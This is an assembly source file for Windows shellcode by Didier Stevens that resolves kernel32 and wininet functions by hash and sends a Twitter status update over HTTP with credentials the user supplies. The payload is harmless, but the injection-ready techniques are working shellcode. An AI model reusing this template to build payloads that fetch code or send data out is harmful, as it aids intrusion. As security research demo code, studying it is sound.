; Shellcode to send a Twitter update
; Written for NASM assembler (http://www.nasm.us) by Didier Stevens
; https://DidierStevens.com
; Use at your own risk
;
; History:
;   2010/03/09: start
;   2010/03/10: added TWITTER_ defines

BITS 32

; Customize the following 3 TWITTER_ values according to your needs
; Notice that your Tweet has to be URL encoded!
; USER_AGENT is another value you might want to customize

%define TWITTER_CREDENTIAL_NAME "user"
%define TWITTER_CREDENTIAL_PASSWORD "password"
%define TWITTER_TWEET_URL_ENCODED "This+is+a+Tweet+from+shellcode"

KERNEL32_HASH equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS equ 2
KERNEL32_LOADLIBRARYA_HASH			equ 0x000d5786
KERNEL32_GETPROCADDRESS_HASH		equ 0x00348bfa

WININET_HASH equ 0x00070c48
WININET_NUMBER_OF_FUNCTIONS equ 5
WININET_INTERNETOPENA_HASH equ 0x001af002
WININET_INTERNETCONNECTA_HASH equ 0x00d77bba
WININET_HTTPOPENREQUESTA_HASH equ 0x00dabbda
WININET_HTTPSENDREQUESTA_HASH equ 0x00dab3da
WININET_INTERNETCLOSEHANDLE_HASH equ 0x06bbde1a

INTERNET_OPEN_TYPE_PRECONFIG equ 0
INTERNET_SERVICE_HTTP equ 3
INTERNET_DEFAULT_HTTP_PORT equ 80
INTERNET_FLAG_NO_CACHE_WRITE equ 0x04000000
INTERNET_FLAG_NO_COOKIES equ 0x00080000

segment .text
	call geteip
geteip:
	pop ebx

  ; Setup environment kernel32
	lea esi, [KERNEL32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [KERNEL32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte KERNEL32_NUMBER_OF_FUNCTIONS
	push KERNEL32_HASH
	call LookupFunctions

	; Setup environment wininet.dll
	lea esi, [WININETDLL-geteip+ebx]
	push esi
	call [KERNEL32_LOADLIBRARY-geteip+ebx]
	lea esi, [WININET_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [WININET_HASHES_TABLE-geteip+ebx]
	push esi
	push byte WININET_NUMBER_OF_FUNCTIONS
	push WININET_HASH
	call LookupFunctions

	; hiOpen = InternetOpen(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	xor edi, edi
	push edi
	push edi
	push edi
	push dword INTERNET_OPEN_TYPE_PRECONFIG
	lea esi, [USER_AGENT-geteip+ebx]
	push esi
	call [WININET_INTERNETOPENA-geteip+ebx]
	mov [HANDLE_OPEN-geteip+ebx], eax

	;	hiConnect = InternetConnect(hiOpen, DOMAIN, INTERNET_DEFAULT_HTTP_PORT, USERNAME, PASSWORD, INTERNET_SERVICE_HTTP, 0, dwContext);
	push dword 0x1234
	xor edi, edi
	push edi
	push dword INTERNET_SERVICE_HTTP
	lea esi, [PASSWORD-geteip+ebx]
	push esi
	lea esi, [USERNAME-geteip+ebx]
	push esi
	push dword INTERNET_DEFAULT_HTTP_PORT
	lea esi, [DOMAIN-geteip+ebx]
	push esi
	push eax
	call [WININET_INTERNETCONNECTA-geteip+ebx]
	mov [HANDLE_CONNECT-geteip+ebx], eax

	; hiHttp = HttpOpenRequest(hiConnect, "POST", FILE_PATH, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES, (DWORD_PTR) &dwContext);
	lea esi, [CONTEXT-geteip+ebx]
	push esi
	push dword INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES
	xor edi, edi
	push edi
	push edi
	push edi
	lea esi, [FILE_PATH-geteip+ebx]
	push esi
	lea esi, [POST-geteip+ebx]
	push esi
	push eax
	call [WININET_HTTPOPENREQUESTA-geteip+ebx]
	mov [HANDLE_HTTP-geteip+ebx], eax

	;	bResult = HttpSendRequest(hiHttp, NULL, 0, szData, strlen(szData));
	push dword TWEET_SIZE
	lea esi, [TWEET-geteip+ebx]
	push esi
	xor edi, edi
	push edi
	push edi
	push eax
	call [WININET_HTTPSENDREQUESTA-geteip+ebx]

	;	InternetCloseHandle(hiHttp);
	push dword [HANDLE_HTTP-geteip+ebx]
	call [WININET_INTERNETCLOSEHANDLE-geteip+ebx]

	;	InternetCloseHandle(hiConnect);
	push dword [HANDLE_CONNECT-geteip+ebx]
	call [WININET_INTERNETCLOSEHANDLE-geteip+ebx]

	;	InternetCloseHandle(hiOpen);
	push dword [HANDLE_OPEN-geteip+ebx]
	call [WININET_INTERNETCLOSEHANDLE-geteip+ebx]
	
	ret

%include "sc-api-functions.asm"

KERNEL32_HASHES_TABLE:
	dd KERNEL32_LOADLIBRARYA_HASH
	dd KERNEL32_GETPROCADDRESS_HASH

KERNEL32_FUNCTIONS_TABLE:
KERNEL32_LOADLIBRARY			dd 0x00000000
KERNEL32_GETPROCADDRA			dd 0x00000000

WININET_HASHES_TABLE:
	dd WININET_INTERNETOPENA_HASH
	dd WININET_INTERNETCONNECTA_HASH
	dd WININET_HTTPOPENREQUESTA_HASH
	dd WININET_HTTPSENDREQUESTA_HASH
	dd WININET_INTERNETCLOSEHANDLE_HASH

WININET_FUNCTIONS_TABLE:
WININET_INTERNETOPENA					dd 0x00000000
WININET_INTERNETCONNECTA			dd 0x00000000
WININET_HTTPOPENREQUESTA			dd 0x00000000
WININET_HTTPSENDREQUESTA			dd 0x00000000
WININET_INTERNETCLOSEHANDLE		dd 0x00000000

HANDLE_OPEN	dd 0x00000000
HANDLE_CONNECT dd 0x00000000
HANDLE_HTTP dd 0x00000000
CONTEXT dd 0x00000000

DOMAIN:
	db "api.twitter.com", 0
FILE_PATH:
	db "/1/statuses/update.xml", 0
POST:
	db "POST", 0
%strcat STATUS "status=", TWITTER_TWEET_URL_ENCODED
TWEET:
	db STATUS
TWEET_SIZE equ $-TWEET
USER_AGENT:
	db "", 0
USERNAME:
	db TWITTER_CREDENTIAL_NAME, 0
PASSWORD:
	db TWITTER_CREDENTIAL_PASSWORD, 0
WININETDLL:
	db "wininet.dll", 0
